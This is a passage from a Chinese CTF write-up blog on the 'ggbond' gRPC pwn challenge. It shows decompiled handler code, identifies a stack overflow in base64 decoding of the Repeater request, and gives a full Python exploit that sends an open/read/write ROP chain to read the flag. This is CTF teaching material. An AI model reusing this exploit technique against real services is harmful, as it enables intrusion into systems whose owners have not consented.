      v26 &#x3D; (RTYPE **)v17-&gt;Response.tab;
      v27 &#x3D; (__int64 *)v17-&gt;Response.data;
      if ( v26 !&#x3D; v25 )
        runtime_panicdottypeI(
          v17-&gt;Response.tab,
          (unsigned int)&amp;RTYPE__ptr_ggbond_Response_RoleChange,
          (unsigned int)&amp;RTYPE_ggbond_isResponse_Response,
          (_DWORD)p_data,
          v3,
          v22,
          v23,
          (_DWORD)v26);
      if ( qword_C525A8 &lt;&#x3D; (unsigned __int64)v71 )
        runtime_panicIndex(v71, &amp;RTYPE__ptr_ggbond_Response_RoleChange, qword_C525A8, p_data, v3, v22, v23, off_C525A0);
      v76 &#x3D; v17;
      v86 &#x3D; v27;
      v28 &#x3D; runtime_concatstring3(
              0,
              (unsigned int)&amp;aPrototyperpcVR[2958],
              10,
              (unsigned int)off_C525A0[2 * v71],
              (unsigned int)off_C525A0[2 * v71 + 1],
              (unsigned int)&quot;.&quot;,
              1,
              (_DWORD)off_C525A0,
              (_DWORD)v27);
      v29 &#x3D; *v86;
      *(_QWORD *)(*v86 + 48) &#x3D; &amp;aPrototyperpcVR[2958];
      if ( dword_C95060 )
        runtime_gcWriteBarrier(v29 + 40);
      else
        *(_QWORD *)(v29 + 40) &#x3D; v28;
      v17 &#x3D; v76;
    &#125;
    v18 &#x3D; 0LL;
    v19 &#x3D; 0LL;
    goto LABEL_90;
  &#125;
  if ( tab &#x3D;&#x3D; off_9799C0 )
  &#123;
    v96 &#x3D; p_data;
    if ( qword_C94B80 &#x3D;&#x3D; 3 )
    &#123;
      p_ggbond_RepeaterResponse &#x3D; (ggbond_RepeaterResponse *)runtime_newobject(&amp;RTYPE_ggbond_RepeaterResponse);
      p_ggbond_Response_Repeater &#x3D; (ggbond_Response_Repeater *)runtime_newobject(&amp;RTYPE_ggbond_Response_Repeater);
      v84 &#x3D; p_ggbond_Response_Repeater;
      if ( dword_C95060 )
      &#123;
        p_data &#x3D; (_ptr_ggbond_Request)p_ggbond_Response_Repeater;
        runtime_gcWriteBarrierCX(p_ggbond_Response_Repeater, v3, v33);
      &#125;
      else
      &#123;
        p_ggbond_Response_Repeater-&gt;Repeater &#x3D; p_ggbond_RepeaterResponse;
      &#125;
      v34 &#x3D; (ggbond_Response *)runtime_newobject(&amp;RTYPE_ggbond_Response);
      v38 &#x3D; off_979A60;
      v34-&gt;Response.tab &#x3D; off_979A60;
      if ( dword_C95060 )
      &#123;
        p_data &#x3D; (_ptr_ggbond_Request)&amp;v34-&gt;Response.data;
        v34 &#x3D; (ggbond_Response *)runtime_gcWriteBarrierDX(&amp;v34-&gt;Response.data, v3);
      &#125;
      else
      &#123;
        v34-&gt;Response.data &#x3D; v84;
      &#125;
      v39 &#x3D; (__int64 *)v34-&gt;Response.data;
      if ( v34-&gt;Response.tab !&#x3D; v38 )
        runtime_panicdottypeI(
          v34-&gt;Response.tab,
          (unsigned int)&amp;RTYPE__ptr_ggbond_Response_Repeater,
          (unsigned int)&amp;RTYPE_ggbond_isResponse_Response,
          (_DWORD)p_data,
          v3,
          (_DWORD)v39,
          v35,
          v36);
      if ( (unsigned __int64)qword_C525A8 &lt;&#x3D; 3 )
        runtime_panicIndex(3LL, &amp;RTYPE__ptr_ggbond_Response_Repeater, qword_C525A8, p_data, v3, v39, v35, v36);
      v74 &#x3D; v34;
      v86 &#x3D; v39;
      v40 &#x3D; off_C525A0[6];
      v41 &#x3D; runtime_concatstring2(
              0,
              (_DWORD)v40,
              (unsigned int)off_C525A0[7],
              (unsigned int)&amp;aContinueWantR1[401],
              13,
              (_DWORD)v39,
              v35,
              v36,
              v37);
      v45 &#x3D; *v86;
      *(_QWORD *)(*v86 + 48) &#x3D; v40;
      if ( dword_C95060 )
      &#123;
        v45 +&#x3D; 40LL;
        runtime_gcWriteBarrier(v45);
      &#125;
      else
      &#123;
        *(_QWORD *)(v45 + 40) &#x3D; v41;
      &#125;
      v46 &#x3D; (RTYPE **)v96-&gt;Request.tab;
      if ( v46 !&#x3D; off_9799C0 )
        runtime_panicdottypeI(
          (_DWORD)v46,
          (unsigned int)&amp;RTYPE__ptr_ggbond_Request_Repeater,
          (unsigned int)&amp;RTYPE_ggbond_isRequest_Request,
          v45,
          (unsigned int)off_9799C0,
          v42,
          v43,
          v44);
      v97 &#x3D; *(string *)(*(_QWORD *)v96-&gt;Request.data + 40LL);
      len &#x3D; v97.len;
      v99 &#x3D; encoding_base64__ptr_Encoding_DecodeString(qword_C62CA0, v97);
      ptr &#x3D; v99.0.ptr;
      v89 &#x3D; v99.0.len;
      cap &#x3D; v99.0.cap;
      v73[0] &#x3D; v5;
      v73[1] &#x3D; v5;
      v91 &#x3D; v73;
      v92 &#x3D; 32LL;
      v93 &#x3D; 32LL;
      v47 &#x3D; v73;
      v48 &#x3D; v99.0.ptr;
      for ( i &#x3D; 0LL; i &lt; (__int64)(3 * (len &gt;&gt; 2)); ++i )
      &#123;
        *(_BYTE *)v47 &#x3D; *v48;
        v47 &#x3D; (__int128 *)((char *)v47 + 1);
        ++v48;
      &#125;
      v17 &#x3D; v74;
      v18 &#x3D; 0LL;
      v19 &#x3D; 0LL;
    &#125;
    else
    &#123;
      v81 &#x3D; (ggbond_RepeaterResponse *)runtime_newobject(&amp;RTYPE_ggbond_RepeaterResponse);
      v50 &#x3D; (ggbond_Response_Repeater *)runtime_newobject(&amp;RTYPE_ggbond_Response_Repeater);
      v84 &#x3D; v50;
      if ( dword_C95060 )
      &#123;
        p_data &#x3D; (_ptr_ggbond_Request)v50;
        runtime_gcWriteBarrierCX(v50, v3, v51);
      &#125;
      else
      &#123;
        v50-&gt;Repeater &#x3D; v81;
      &#125;
      v52 &#x3D; (ggbond_Response *)runtime_newobject(&amp;RTYPE_ggbond_Response);
      v55 &#x3D; off_979A60;
      v52-&gt;Response.tab &#x3D; off_979A60;
      if ( dword_C95060 )
      &#123;
        p_data &#x3D; (_ptr_ggbond_Request)&amp;v52-&gt;Response.data;
        v52 &#x3D; (ggbond_Response *)runtime_gcWriteBarrierDX(&amp;v52-&gt;Response.data, v3);
      &#125;
      else
      &#123;
        v52-&gt;Response.data &#x3D; v84;
      &#125;
      v56 &#x3D; (__int64 *)v52-&gt;Response.data;
      if ( v52-&gt;Response.tab !&#x3D; v55 )
        runtime_panicdottypeI(
          v52-&gt;Response.tab,
          (unsigned int)&amp;RTYPE__ptr_ggbond_Response_Repeater,
          (unsigned int)&amp;RTYPE_ggbond_isResponse_Response,
          (_DWORD)p_data,
          v3,
          v53,
          v54,
          (_DWORD)v56);
      if ( qword_C525A8 &lt;&#x3D; (unsigned __int64)qword_C94B80 )
        runtime_panicIndex(qword_C94B80, &amp;RTYPE__ptr_ggbond_Response_Repeater, qword_C525A8, p_data, v3, v53, v54, v56);
      v57 &#x3D; off_C525A0[2 * qword_C94B80];
      v58 &#x3D; off_C525A0[2 * qword_C94B80 + 1];
      v59 &#x3D; (RTYPE **)v96-&gt;Request.tab;
      v60 &#x3D; v96-&gt;Request.data;
      if ( v59 !&#x3D; off_9799C0 )
        runtime_panicdottypeI(
          v96-&gt;Request.tab,
          (unsigned int)&amp;RTYPE__ptr_ggbond_Request_Repeater,
          (unsigned int)&amp;RTYPE_ggbond_isRequest_Request,
          (_DWORD)p_data,
          v3,
          v53,
          v54,
          (_DWORD)v56);
      v75 &#x3D; v52;
      v86 &#x3D; v56;
      v61 &#x3D; runtime_concatstring3(
              0,
              (_DWORD)v57,
              (_DWORD)v58,
              (unsigned int)&quot;: :&#x2F;:&#x3D;:]; &lt;-&lt;&lt;&lt;&#x3D;&#x3D;#&#x3D;&#x3D;&gt; &gt;&#x3D;&gt;&gt;??A3A4CNCcCfCoCsGOGTLTLlLmLoLtLuMXMcMeMnNSNdNlNoOKOUPcPdPePfPiPoPsSTScSkSmSoTZTeToV1V2V3V5V6YiZlZpZs[]\&quot;)\&quot;:\&quot;&gt;\&quot;\n\\$\\&#39;\\(\\)\\*\\-\\.\\&#x2F;\\0\\9\\?\\D\\E\\S\\W\\[\\\&quot;\\\\\\]\\^\\a\\c\\d\\f\\n\\r\\s\\t\\w\\&#123;\\|\\&#125;\n \n\t\r\n\t 聽] ])]:][]\n^&#x3D;&#96;\\aAbBdoeEeqfFgegogti)iIidifinipjslLleltmsn&#x3D;nNnensoOorpPpbrRs sStetotvuUusxX&#123;&#123;&#123;&#125;|&#x3D;||&#125;\n&#125;&#125;蛷     G  M  P *( -  &lt;  &gt;  m&#x3D; n&#x3D;%+v%25%2c%: &amp;^&#x3D;&#39;\&quot;&#39;): * &#x2F;....js&#x2F;&#x2F;&#x2F;00001_0\r\n125200204206304400404443500625: &#96;:%d:&#x2F;&#x2F;::1&lt;&lt;&#x3D;&gt;&gt;&#x3D;?*[???ACKAMPAprAugDD;DSADecEOFETHEndFebFriGETGT;GetGg;Gt;HanINTIm;JanJulJunLT;LaoLl;Lt;MD4MD5MarMayMonMroMu;NaNNkoNovNu;OPTOctOr;PC&#x3D;PTRPi;Pr;REGRSARe;SETSOASRVSatSc;SepSunTTLTXTThuTueURIUTCVaiViaWedXi;\&quot;&#125;&#125;\\22\\26\\27\\28\\29\\2b\\2f\\3a\\3b\\3c\\3e\\7b\\7d\n&quot;,
              2,
              *(_QWORD *)(*(_QWORD *)v60 + 40LL),
              *(_QWORD *)(*(_QWORD *)v60 + 48LL),
              (_DWORD)v56,
              (_DWORD)v59);
      v62 &#x3D; *v86;
      *(_QWORD *)(*v86 + 48) &#x3D; v57;
      if ( dword_C95060 )
        runtime_gcWriteBarrier(v62 + 40);
      else
        *(_QWORD *)(v62 + 40) &#x3D; v61;
      v17 &#x3D; v75;
      v18 &#x3D; 0LL;
      v19 &#x3D; 0LL;
    &#125;
  &#125;
  else
  &#123;
LABEL_63:
    p_ggbond_ErrorResponse &#x3D; (ggbond_ErrorResponse *)runtime_newobject(&amp;RTYPE_ggbond_ErrorResponse);
    p_ggbond_Response_Error &#x3D; (ggbond_Response_Error *)runtime_newobject(&amp;RTYPE_ggbond_Response_Error);
    v83 &#x3D; p_ggbond_Response_Error;
    if ( dword_C95060 )
    &#123;
      LODWORD(p_data) &#x3D; (_DWORD)p_ggbond_Response_Error;
      runtime_gcWriteBarrierCX(p_ggbond_Response_Error, v3, v64);
    &#125;
    else
    &#123;
      p_ggbond_Response_Error-&gt;Error &#x3D; p_ggbond_ErrorResponse;
    &#125;
    v17 &#x3D; (ggbond_Response *)runtime_newobject(&amp;RTYPE_ggbond_Response);
    v68 &#x3D; off_979A40;
    v17-&gt;Response.tab &#x3D; off_979A40;
    if ( dword_C95060 )
    &#123;
      LODWORD(p_data) &#x3D; (_DWORD)v17 + 48;
      v17 &#x3D; (ggbond_Response *)runtime_gcWriteBarrierDX(&amp;v17-&gt;Response.data, v3);
    &#125;
    else
    &#123;
      v17-&gt;Response.data &#x3D; v83;
    &#125;
    v69 &#x3D; (__int64 *)v17-&gt;Response.data;
    if ( v17-&gt;Response.tab !&#x3D; v68 )
      runtime_panicdottypeI(
        v17-&gt;Response.tab,
        (unsigned int)&amp;RTYPE__ptr_ggbond_Response_Error,
        (unsigned int)&amp;RTYPE_ggbond_isResponse_Response,
        (_DWORD)p_data,
        (_DWORD)v69,
        v65,
        v66,
        v67);
    v70 &#x3D; *v69;
    *(_QWORD *)(*v69 + 48) &#x3D; 13LL;
    if ( dword_C95060 )
      v17 &#x3D; (ggbond_Response *)runtime_gcWriteBarrierDX(v70 + 40, v69);
    else
      *(_QWORD *)(v70 + 40) &#x3D; &amp;aContinueWantR1[544];
    v18 &#x3D; 0LL;
    v19 &#x3D; 0LL;
  &#125;
LABEL_90:
  result.1.tab &#x3D; v18;
  result.1.data &#x3D; v19;
  result.0 &#x3D; v17;
  return result;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现有三个 if ( tab &#x3D;&#x3D; xxx )的逻辑，同事在runtime_newobject创建对象的时候，正好对应 三个request的逻辑，发whoami的请求时也是走到这段逻辑中去处理，所以这个main__ptr_server_Handler函数就是处理三个request 的关键函数了</p>
<p>存在漏洞的位置是 处理repeater 的时候如果role &#x3D;&#x3D; 3，就会把数据base64deocode后发送到栈上，没有对长度做一个判断存在一个栈溢出</p>
<pre class="line-numbers language-none"><code class="language-none">if ( tab &#x3D;&#x3D; off_9799C0 )
&#123;
  v96 &#x3D; p_data;
  if ( qword_C94B80 &#x3D;&#x3D; 3 )
  &#123;
    p_ggbond_RepeaterResponse &#x3D; (ggbond_RepeaterResponse *)runtime_newobject(&amp;RTYPE_ggbond_RepeaterResponse);
    p_ggbond_Response_Repeater &#x3D; (ggbond_Response_Repeater *)runtime_newobject(&amp;RTYPE_ggbond_Response_Repeater);
    v84 &#x3D; p_ggbond_Response_Repeater;
    if ( dword_C95060 )
    &#123;
      p_data &#x3D; (_ptr_ggbond_Request)p_ggbond_Response_Repeater;
      runtime_gcWriteBarrierCX(p_ggbond_Response_Repeater, v3, v33);
    &#125;
    else
    &#123;
      p_ggbond_Response_Repeater-&gt;Repeater &#x3D; p_ggbond_RepeaterResponse;
    &#125;
    v34 &#x3D; (ggbond_Response *)runtime_newobject(&amp;RTYPE_ggbond_Response);
    v38 &#x3D; off_979A60;
    v34-&gt;Response.tab &#x3D; off_979A60;
    if ( dword_C95060 )
    &#123;
      p_data &#x3D; (_ptr_ggbond_Request)&amp;v34-&gt;Response.data;
      v34 &#x3D; (ggbond_Response *)runtime_gcWriteBarrierDX(&amp;v34-&gt;Response.data, v3);
    &#125;
    else
    &#123;
      v34-&gt;Response.data &#x3D; v84;
    &#125;
    v39 &#x3D; (__int64 *)v34-&gt;Response.data;
    if ( v34-&gt;Response.tab !&#x3D; v38 )
      runtime_panicdottypeI(
        v34-&gt;Response.tab,
        (unsigned int)&amp;RTYPE__ptr_ggbond_Response_Repeater,
        (unsigned int)&amp;RTYPE_ggbond_isResponse_Response,
        (_DWORD)p_data,
        v3,
        (_DWORD)v39,
        v35,
        v36);
    if ( (unsigned __int64)qword_C525A8 &lt;&#x3D; 3 )
      runtime_panicIndex(3LL, &amp;RTYPE__ptr_ggbond_Response_Repeater, qword_C525A8, p_data, v3, v39, v35, v36);
    v74 &#x3D; v34;
    v86 &#x3D; v39;
    v40 &#x3D; off_C525A0[6];
    v41 &#x3D; runtime_concatstring2(
            0,
            (_DWORD)v40,
            (unsigned int)off_C525A0[7],
            (unsigned int)&amp;aContinueWantR1[401],
            13,
            (_DWORD)v39,
            v35,
            v36,
            v37);
    v45 &#x3D; *v86;
    *(_QWORD *)(*v86 + 48) &#x3D; v40;
    if ( dword_C95060 )
    &#123;
      v45 +&#x3D; 40LL;
      runtime_gcWriteBarrier(v45);
    &#125;
    else
    &#123;
      *(_QWORD *)(v45 + 40) &#x3D; v41;
    &#125;
    v46 &#x3D; (RTYPE **)v96-&gt;Request.tab;
    if ( v46 !&#x3D; off_9799C0 )
      runtime_panicdottypeI(
        (_DWORD)v46,
        (unsigned int)&amp;RTYPE__ptr_ggbond_Request_Repeater,
        (unsigned int)&amp;RTYPE_ggbond_isRequest_Request,
        v45,
        (unsigned int)off_9799C0,
        v42,
        v43,
        v44);
    v97 &#x3D; *(string *)(*(_QWORD *)v96-&gt;Request.data + 40LL);
    len &#x3D; v97.len;
    v99 &#x3D; encoding_base64__ptr_Encoding_DecodeString(qword_C62CA0, v97);
    ptr &#x3D; v99.0.ptr;
    v89 &#x3D; v99.0.len;
    cap &#x3D; v99.0.cap;
    v73[0] &#x3D; v5;
    v73[1] &#x3D; v5;
    v91 &#x3D; v73;
    v92 &#x3D; 32LL;
    v93 &#x3D; 32LL;
    v47 &#x3D; v73;
    v48 &#x3D; v99.0.ptr;
    for ( i &#x3D; 0LL; i &lt; (__int64)(3 * (len &gt;&gt; 2)); ++i )
    &#123;
      *(_BYTE *)v47 &#x3D; *v48;
      v47 &#x3D; (__int128 *)((char *)v47 + 1);
      ++v48;
    &#125;
    v17 &#x3D; v74;
    v18 &#x3D; 0LL;
    v19 &#x3D; 0LL;
  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这里存在溢出</p>
<pre class="line-numbers language-none"><code class="language-none">  for ( i &#x3D; 0LL; i &lt; (__int64)(3 * (len &gt;&gt; 2)); ++i )
  &#123;
    *(_BYTE *)v47 &#x3D; *v48;
    v47 &#x3D; (__int128 *)((char *)v47 + 1);
    ++v48;
  &#125;
  v17 &#x3D; v74;
  v18 &#x3D; 0LL;
  v19 &#x3D; 0LL;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用的思路是，orw把flag 从socket的 fd那读出来</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> grpc

<span class="token keyword">import</span> ggbond_pb2
<span class="token keyword">import</span> ggbond_pb2_grpc

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">whoami</span><span class="token punctuation">(</span>chan<span class="token punctuation">)</span><span class="token punctuation">:</span>
    stub<span class="token operator">=</span>ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>chan<span class="token punctuation">)</span>
    respond<span class="token operator">=</span>stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>whoami<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>WhoamiRequest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> respond

<span class="token keyword">def</span> <span class="token function">role_change</span><span class="token punctuation">(</span>chan<span class="token punctuation">,</span>role<span class="token punctuation">)</span><span class="token punctuation">:</span>
    stub<span class="token operator">=</span>ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>chan<span class="token punctuation">)</span>
    respond<span class="token operator">=</span>stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>role_change<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>RoleChangeRequest<span class="token punctuation">(</span>role<span class="token operator">=</span>role<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> respond

<span class="token keyword">def</span> <span class="token function">repeater</span><span class="token punctuation">(</span>chan<span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    stub<span class="token operator">=</span>ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>chan<span class="token punctuation">)</span>
    respond<span class="token operator">=</span>stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>repeater<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>RepeaterRequest<span class="token punctuation">(</span>message<span class="token operator">=</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> respond

file_path <span class="token operator">=</span> <span class="token string">'./pwn'</span>
p1 <span class="token operator">=</span> process<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">23334</span><span class="token punctuation">)</span>

channel<span class="token operator">=</span>grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>role_change<span class="token punctuation">(</span>channel<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

rdi_addr <span class="token operator">=</span> <span class="token number">0x401537</span>
rsi_addr <span class="token operator">=</span> <span class="token number">0x422398</span>
rdx_addr <span class="token operator">=</span> <span class="token number">0x461bd1</span>
rax_addr <span class="token operator">=</span> <span class="token number">0x4101e6</span>
syscall_addr <span class="token operator">=</span> <span class="token number">0x40452C</span>
flag_addr <span class="token operator">=</span> <span class="token number">0x7FAEEC</span>
bss_addr <span class="token operator">=</span> <span class="token number">0xC90000</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xc8</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span> <span class="token comment"># open</span>

payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span>

payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span>


<span class="token keyword">try</span><span class="token punctuation">:</span>
    repeater<span class="token punctuation">(</span>channel<span class="token punctuation">,</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/06/30/d3ctf-pwnshell复现/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/06/19/vsctf-pwn/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-06-25 
	</div>
	

	<!-- categories -->
    
